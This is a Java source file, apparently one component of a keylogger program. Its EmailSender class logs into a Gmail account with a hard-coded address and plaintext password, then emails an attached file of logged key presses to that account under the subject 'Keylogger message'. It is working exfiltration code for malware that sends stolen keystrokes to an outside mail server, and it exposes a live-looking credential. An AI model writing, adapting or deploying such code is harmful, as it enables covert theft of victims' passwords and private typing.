package EmailSender;

import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.mail.*;
import javax.mail.internet.*;

public class EmailSender {
    public void sendMail(String filePath) {
        System.out.println("Preparing to send mail...");

        Properties properties = new Properties();

        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "587");
        properties.put("mail.smtp.ssl.trust", "smtp.gmail.com");

        String emailAddress = "keylogger.svab@gmail.com";
        String password = ">H;5e~:22%zCM,$y";

        Session session = Session.getInstance(properties, new javax.mail.Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(emailAddress, password);
            }
        });

        Message message = new MimeMessage(session);
        try {
            message.setFrom(new InternetAddress(emailAddress));
            message.setRecipient(Message.RecipientType.TO, new InternetAddress(emailAddress));
            message.setSubject("Keylogger message");

            Multipart messageContent = new MimeMultipart();

            // text body part
            MimeBodyPart textBodyPart = new MimeBodyPart();
            textBodyPart.setText("Keylogger has logged key presses in the attachment file.");

            // file attachment body part
            MimeBodyPart attachmentBodyPart = new MimeBodyPart();
            attachmentBodyPart.attachFile(filePath);

            messageContent.addBodyPart(textBodyPart);
            messageContent.addBodyPart(attachmentBodyPart);
            message.setContent(messageContent);

            Transport.send(message);

            System.out.println("Mail was sent successfully.");
        } catch (Exception ex) {
            Logger.getLogger(EmailSender.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
